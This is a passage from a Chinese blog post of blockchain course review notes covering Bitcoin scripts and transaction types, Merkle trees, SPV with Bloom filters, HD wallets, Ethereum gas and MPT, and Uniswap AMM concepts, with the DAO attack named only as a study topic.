<p>考虑到比特币使用的是基于栈的操作。op_add是一个操作指令，需要有两个操作数，所以scriptSig中一定需要一个数字作为操作数。而后面的指令也很简单，需要和5进行比较操作。所以ScriptSig中需要输入2。</p>
<p>实际中常用的交易类型是P2PKH。使用P2PKH所需要的脚本是这样的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233133.jpg" alt="img"></p>
<p>除了P2PKH之外，还有其他形式的交易，如P2PK，multiSig、P2SH等。另外介绍了一个例子Time_Lock。</p>
<p>在介绍完交易之后，我们讨论了区块的头部。在区块的头部有一个数据结构，Merkle root。在比特币网络中，Merkle树被用来归纳一个区块中的所有交易，同时生成整个交易集合的数字指纹，且提供了一种校验区块是否存在某交易的高效途径。生成一棵完整的Merkle树需要递归地对哈希节点对进行哈希，并将新生成的哈希节点插入到Merkle树中，直到只剩一个哈希节点，该节点就是Merkle树的根。这里我们需要了解Merkle证明和Merkle路径是怎么回事。</p>
<p>在之后我们介绍了SPV和Bloom过滤器。这里要理解Bloom过滤器的工作特点，为什么Bloom过滤器会造成false positive而不会造成false negative？</p>
<p>接下来，结合310比特币挑战，我们重点讨论了比特币钱包，用户应该如何管理比特币。这里我们主要讨论了助记词。助记词是如何生成的呢？</p>
<p>为了生成大量的密钥对，引入了HD钱包的概念。应该理解HD钱包是如何生成大量的密钥的。</p>
<p>以上是比特币的内容。接下来，我们开始介绍以太坊。以太坊提供了远比比特币广的应用场景，主要是因为它大大提高了区块的生成速度，以及提供了图灵完备的脚本语言。为了支持这些特性，相比于比特币，它引入一些新的概念，如Gas。请问Gas的目的是什么？</p>
<p>另外，为了支持基于账户的交易的支持，以太坊维护了状态树，因为状态树需要经常更新，所以以太坊使用了MPT。要求能够根据给出的键值对，画出相应的MPT。</p>
<p>接下来重点考虑了区块链的安全问题。区块链本身可能受到攻击，以太坊上的智能合约也有可能受到攻击。【在介绍智能合约的安全问题时，我们讨论了THE DAO 和 Fomo3d的攻击。要能够理解攻击产生的原因。】</p>
<p>Uniswap是DeFi中最著名的协议之一，在其中锁定和流动着巨额的资金。重点介绍了AMM的概念、计算；包括恒定乘积、滑点、无常损失等。</p>
<hr>
<p>答疑课上的共性问题，SPV使用bloom filter进行查询的时候，会什么需要更新bloom filter？</p>
<p>BIP 37在实现时，提供了Bloom_update_none选项，也即不更新。主要是因为，随着加入项的增多，Bloom Filter的效率会变低，用户可能需要定时刷新filter。同时，提供了Bloom_update_all选项，也即上文提到的将输出中的scriptpbk中的outpoint都加入进来；另外，还提供了Bloom_update_P2PUBKEY_ONLY选项，也即仅在输出脚本是 pay-to-pubkey或者是pay to multisig形式的时候才将outpoint添加到filter中。</p>
<p>我们来分析一下这样做的道理。为啥要加入outpoint，这里我们可以理解outpoint是包括了(txid，outputid)的一个数据结构。</p>
<p>如果用户要查询他的收入的，也即需要查询所有的scriptpbk中与他相关的交易。那么来分析一下我们介绍的P2PKH、P2PK、P2multisig以及P2SH这四种交易中，分别需要提供什么信息。</p>
<p>对于P2PKH，只需要提供公钥的哈希就能查询到；对于P2PK和P2multisig，只需要提供公钥就能查询到；对于P2SH，提供脚本的哈希就能查询到。这些信息都是可以提前确认的，所以并不需要更新filter。</p>
<p>但是当用户要查询他的支出，此时也即要查询所有的scriptsig。这时候我们需要向filter中提供什么信息呢？</p>
<p>对于收款交易是P2PKH的情况，只需要提供公钥就能查询到；对于收款交易是P2SH的情况，提供就能查询到；这些信息都是可以提前确认的，所以并不需要更新filter。但是对于P2PK和P2multisig呢？为了从这两种交易中赎出钱，需要提供的是签名，但是签名并不能提前确认；在这个scriptsig中能够确认的就是它是从哪里赎出的钱，也即outpoint，所以，需要向filter中添加这些信息。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">MingwHuang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mingwzi.cn/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/">http://mingwzi.cn/2021/12/21/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mingwzi.cn" target="_blank">MingwHuang's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a><a class="post-meta__tags" href="/tags/%E6%AF%94%E7%89%B9%E5%B8%81/">比特币</a><a class="post-meta__tags" href="/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/">以太坊</a></div><div class="post_share"><div class="social-share" data-image="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202172251674.png" target="_blank"><img class="post-qr-code-img" src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202172251674.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202172251973.png" target="_blank"><img class="post-qr-code-img" src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202172251973.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/21/Chaos/Markdown/"><img class="prev-cover" src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Markdown 教程</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab2-CSS/"><img class="next-cover" src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047554.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">信息安全实践Lab2-CSS</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272113875.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">MingwHuang</div><div class="author-info__description">朝花夕拾 聊以记之</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/HuangMingwang" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1125385880@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站域名：http://mingwzi.cn</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF1-%E6%AF%94%E7%89%B9%E5%B8%81%E5%85%AB%E5%8D%A6"><span class="toc-number">1.</span> <span class="toc-text">区块链技术1:比特币八卦</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E8%B4%A7%E5%B8%81%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.</span> <span class="toc-text">区块链的货币属性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF2-%E7%94%B5%E5%AD%90%E8%B4%A7%E5%B8%81%E7%9A%84%E5%8E%86%E5%8F%B2"><span class="toc-number">2.</span> <span class="toc-text">区块链技术2:电子货币的历史</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eCash"><span class="toc-number">2.1.</span> <span class="toc-text">eCash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashCash"><span class="toc-number">2.2.</span> <span class="toc-text">HashCash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#B-money"><span class="toc-number">2.3.</span> <span class="toc-text">B-money</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E7%89%B9%E5%B8%81"><span class="toc-number">2.4.</span> <span class="toc-text">比特币</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF3-%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E5%93%88%E5%B8%8C"><span class="toc-number">3.</span> <span class="toc-text">区块链技术3:密码学之哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C"><span class="toc-number">3.1.</span> <span class="toc-text">哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%97%E5%86%B2%E7%AA%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">抗冲突</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hiding"><span class="toc-number">3.1.2.</span> <span class="toc-text">Hiding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#puzzle-friendliness"><span class="toc-number">3.1.3.</span> <span class="toc-text">puzzle friendliness</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95SHA-256"><span class="toc-number">3.2.</span> <span class="toc-text">哈希算法SHA-$256$</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF4-%E5%AF%86%E7%A0%81%E5%AD%A6%E6%8C%87%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">4.</span> <span class="toc-text">区块链技术4:密码学指非对称加密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">非对称加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DH%E7%AE%97%E6%B3%95"><span class="toc-number">4.1.1.</span> <span class="toc-text">DH算法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E6%A0%B9"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">原根</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">欧拉函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA%E7%AE%97%E6%B3%95"><span class="toc-number">4.1.2.</span> <span class="toc-text">RSA算法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA%E8%BF%87%E7%A8%8B%E7%9A%84%E5%85%B7%E4%BD%93%E4%BE%8B%E5%AD%90"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">RSA过程的具体例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA%E7%AE%97%E6%B3%95%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%80%A7"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">RSA算法的可靠性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">4.1.2.3.</span> <span class="toc-text">加密解密过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%81%E9%92%A5%E8%A7%A3%E5%AF%86%E8%AF%81%E6%98%8E"><span class="toc-number">4.1.2.4.</span> <span class="toc-text">私钥解密证明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">4.1.2.5.</span> <span class="toc-text">应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECC%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86"><span class="toc-number">4.1.3.</span> <span class="toc-text">ECC椭圆曲线加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E5%9C%A8%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">4.1.4.</span> <span class="toc-text">非对称加密在区块链中的应用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF6-%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">区块链技术6:去中心化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%B8%83%E5%BC%8F%E5%85%B1%E8%AF%86%EF%BC%88distributed-consensus"><span class="toc-number">5.1.</span> <span class="toc-text">分布式共识（distributed consensus)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">区块链共识算法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%89%E5%B8%81"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">分叉币</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF7-%E6%AF%94%E7%89%B9%E5%B8%81%E7%9A%84%E6%9C%BA%E5%88%B6-1"><span class="toc-number">6.</span> <span class="toc-text">区块链技术7:比特币的机制(1)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E6%98%93"><span class="toc-number">6.1.</span> <span class="toc-text">交易</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E6%98%93%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text">交易的语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AF%94%E7%89%B9%E5%B8%81%E8%84%9A%E6%9C%AC"><span class="toc-number">6.3.</span> <span class="toc-text">比特币脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF8-%E6%AF%94%E7%89%B9%E5%B8%81%E7%9A%84%E6%9C%BA%E5%88%B6-2"><span class="toc-number">7.</span> <span class="toc-text">区块链技术8:比特币的机制(2)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OP-CHECKMULSIG"><span class="toc-number">7.1.</span> <span class="toc-text">OP_CHECKMULSIG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P2SH%EF%BC%88pay-to-script-hash"><span class="toc-number">7.2.</span> <span class="toc-text">P2SH（pay-to-script-hash)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8P2SH%E5%9C%B0%E5%9D%80%E7%94%9F%E6%88%90%E4%BA%A4%E6%98%93"><span class="toc-number">7.3.</span> <span class="toc-text">使用P2SH地址生成交易</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%8E%E5%9B%9Emultisig-P2SH%E5%B8%81"><span class="toc-number">7.4.</span> <span class="toc-text">赎回multisig P2SH币</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TimeLock"><span class="toc-number">7.5.</span> <span class="toc-text">TimeLock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6"><span class="toc-number">7.6.</span> <span class="toc-text">智能合约</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E7%89%B9%E5%B8%81%E6%8A%80%E6%9C%AF9-%E6%AF%94%E7%89%B9%E5%B8%81%E6%9C%BA%E5%88%B6-3"><span class="toc-number">8.</span> <span class="toc-text">比特币技术9:比特币机制(3)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Merkle%E6%A0%91"><span class="toc-number">8.1.</span> <span class="toc-text">Merkle树</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84Merkle%E6%A0%91"><span class="toc-number">8.1.1.</span> <span class="toc-text">比特币中的Merkle树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Merkle%E6%A0%91%E6%A6%82%E5%BF%B5"><span class="toc-number">8.1.2.</span> <span class="toc-text">Merkle树概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPV-simple-payment-verification"><span class="toc-number">8.1.3.</span> <span class="toc-text">SPV(simple payment verification)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sybil%E6%94%BB%E5%87%BB"><span class="toc-number">8.2.</span> <span class="toc-text">Sybil攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bloom-Filter"><span class="toc-number">8.3.</span> <span class="toc-text">Bloom Filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Partial-Merkle-branch-format"><span class="toc-number">8.4.</span> <span class="toc-text">Partial Merkle branch format</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Constructing-a-partial-merkle-tree-object"><span class="toc-number">8.5.</span> <span class="toc-text">Constructing a partial merkle tree object</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Parsing-a-partial-merkle-tree-object"><span class="toc-number">8.6.</span> <span class="toc-text">Parsing a partial merkle tree object</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF10-%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8%E5%92%8C%E4%BD%BF%E7%94%A8%E6%AF%94%E7%89%B9%E5%B8%81"><span class="toc-number">9.</span> <span class="toc-text">区块链技术10:如何存储和使用比特币</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%A1%AE%E5%AE%9A%E6%80%A7%E9%92%B1%E5%8C%85"><span class="toc-number">9.1.</span> <span class="toc-text">非确定性钱包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%80%A7%E9%92%B1%E5%8C%85"><span class="toc-number">9.2.</span> <span class="toc-text">确定性钱包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HD%E9%92%B1%E5%8C%85"><span class="toc-number">9.2.1.</span> <span class="toc-text">HD钱包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HD-%E9%92%B1%E5%8C%85%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-number">9.2.2.</span> <span class="toc-text">HD 钱包的优势</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">10.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF11-%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BB%8B%E7%BB%8D"><span class="toc-number">11.</span> <span class="toc-text">区块链技术11:以太坊介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E6%8B%A5%E6%9C%89%E8%B4%A6%E6%88%B7%EF%BC%88EOA%EF%BC%89%E4%B8%8E%E5%90%88%E7%BA%A6%E8%B4%A6%E6%88%B7%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-number">11.1.</span> <span class="toc-text">外部拥有账户（EOA）与合约账户的比较</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E7%8A%B6%E6%80%81"><span class="toc-number">11.1.1.</span> <span class="toc-text">账户状态</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%9A%84%E6%A6%82%E5%BF%B5%E6%98%AF%EF%BC%9Akey%E5%80%BC%E7%BC%96%E7%A0%81"><span class="toc-number">11.2.</span> <span class="toc-text">还有一个重要的概念是：key值编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Raw%E7%BC%96%E7%A0%81"><span class="toc-number">11.2.1.</span> <span class="toc-text">Raw编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hex%E7%BC%96%E7%A0%81"><span class="toc-number">11.2.2.</span> <span class="toc-text">Hex编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HP%E7%BC%96%E7%A0%81"><span class="toc-number">11.2.3.</span> <span class="toc-text">HP编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF12%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">区块链技术12：区块链安全（1）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#verge"><span class="toc-number">12.1.</span> <span class="toc-text">verge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#THE-DAO%E6%94%BB%E5%87%BB"><span class="toc-number">12.2.</span> <span class="toc-text">THE DAO攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E9%80%80%E5%87%BD%E6%95%B0-fallback"><span class="toc-number">12.2.1.</span> <span class="toc-text">回退函数 - fallback()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">12.2.2.</span> <span class="toc-text">解决方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%BF%E5%B7%A5%E6%8A%95%E7%A5%A8%E4%B8%8E%E5%8C%BA%E5%9D%97%E5%A4%B4%E6%A0%A1%E9%AA%8C"><span class="toc-number">12.2.3.</span> <span class="toc-text">矿工投票与区块头校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%86%E7%A6%BB%E7%BD%91%E7%BB%9C%EF%BC%9F"><span class="toc-number">12.2.4.</span> <span class="toc-text">如何分离网络？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E7%A7%BB%E8%B5%84%E4%BA%A7"><span class="toc-number">12.2.5.</span> <span class="toc-text">转移资产</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF13-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8-2"><span class="toc-number">13.</span> <span class="toc-text">区块链技术13:区块链安全(2)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF14-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%92%8Csolidity%E7%AE%80%E4%BB%8B"><span class="toc-number">14.</span> <span class="toc-text">区块链技术14:智能合约和solidity简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF15-uniswap%E7%AE%80%E4%BB%8B"><span class="toc-number">15.</span> <span class="toc-text">区块链技术15:uniswap简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%81%9A%E5%B8%82%E5%95%86-AMM"><span class="toc-number">15.1.</span> <span class="toc-text">自动化做市商(AMM)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E5%8A%A8%E6%B1%A0"><span class="toc-number">15.1.1.</span> <span class="toc-text">流动池</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E5%A4%8D%E4%B9%A0"><span class="toc-number">16.</span> <span class="toc-text">区块链技术复习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gas%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-number">16.1.</span> <span class="toc-text">gas的目的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%A4%9A%E4%B8%AAhash%E5%87%BD%E6%95%B0%E5%91%A2%EF%BC%9F"><span class="toc-number">16.1.0.1.</span> <span class="toc-text">为什么需要多个hash函数呢？</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/03/01/%E9%9D%A2%E8%AF%95/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" title="设计模式"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046164.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="设计模式"/></a><div class="content"><a class="title" href="/2022/03/01/%E9%9D%A2%E8%AF%95/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" title="设计模式">设计模式</a><time datetime="2022-03-01T15:03:15.000Z" title="发表于 2022-03-01 23:03:15">2022-03-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/26/%E9%9D%A2%E8%AF%95/Redis/" title="Redis"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047300.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis"/></a><div class="content"><a class="title" href="/2022/02/26/%E9%9D%A2%E8%AF%95/Redis/" title="Redis">Redis</a><time datetime="2022-02-26T06:21:50.000Z" title="发表于 2022-02-26 14:21:50">2022-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/25/K8S/" title="K8S"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046990.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="K8S"/></a><div class="content"><a class="title" href="/2022/02/25/K8S/" title="K8S">K8S</a><time datetime="2022-02-25T14:38:23.000Z" title="发表于 2022-02-25 22:38:23">2022-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/25/Chaos/Chaos/" title="Chaos"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047300.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chaos"/></a><div class="content"><a class="title" href="/2022/02/25/Chaos/Chaos/" title="Chaos">Chaos</a><time datetime="2022-02-25T14:38:23.000Z" title="发表于 2022-02-25 22:38:23">2022-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/20/Mac-%E6%B7%B1%E5%BA%A6%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" title="Mac 深度使用技巧"><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046012.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mac 深度使用技巧"/></a><div 